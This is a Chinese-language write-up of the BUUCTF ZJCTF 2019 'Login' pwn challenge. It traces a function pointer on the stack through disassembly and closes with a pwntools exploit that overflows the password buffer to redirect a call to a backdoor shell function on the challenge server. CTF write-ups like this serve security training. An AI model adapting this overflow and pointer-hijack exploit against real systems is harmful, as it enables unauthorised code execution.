---
title: BUUCTF-ZJCTF-2019-Login 题解
date: 2026-02-01 14:22:00
tags: 
    - 函数指针
    - pwn
    - BUUCTF
categories: BUUCTF 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#[ZJCTF%202019]Login)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-Login/checksec.png)

存在 canary 保护

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-Login/main.png)

一个简单的登录系统

观察到 [rbp-0x130] ，它来自于 password_checker 的 rax

#### Admin_password_checker

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-Login/Admin_password_checker.png)

snprintf 这里有一个坑， src 和 dest 相同会产生 buffer overlap 的问题，产生非预期结果，而使用 '\x00' 可以截断这种行为

其实经过动调可知，我们应该劫持 a1 为后门函数地址

#### Admin_password_checker_asm

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-Login/Admin_password_checker_asm.png)

上面的 a1 即此处的 rax ，为 rdi 解两层引用，接下来回到 main 去溯源 rdi

#### main_asm

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-Login/main_asm.png)

rdi 溯源至 rbp - 0x130 ，注意并不是 [rbp - 0x130] ， [rbp - 0x130] 溯源至 password_checker 后的 rax 

#### password_checker_asm

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-Login/password_checker_asm.png)

rax 溯源至 rbp - 0x18 ，注意并不是 [rbp - 0x18]  ，由此 call rax 中的 rax 最终溯源 [rbp - 0x18] ，注意此处的 rbp 为 password_checker 的 rbp

#### read_password

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-Login/read_password.png)

#### backdoor

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/ZJCTF-2019-Login/Admin_shell.png)

### 攻击思路

接下来可以直接动调，获取以下信息：
- call rax 中 rax 的最初来源
- read_password 中覆盖到 rax 最初来源所需的溢出长度

然后就可以直接 get shell 啦

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	p = process('./login')
else:
	p = remote('node5.buuoj.cn', 27735)
	
def attack():
	p.sendlineafter(b'username: ', b'admin')
	pwd = b'2jctf_pa5sw0rd\x00'
	payload = pwd.ljust(72, b'\x00') + p64(0x400e88)
	p.sendafter(b'password: ', payload)
	p.interactive()

attack()
```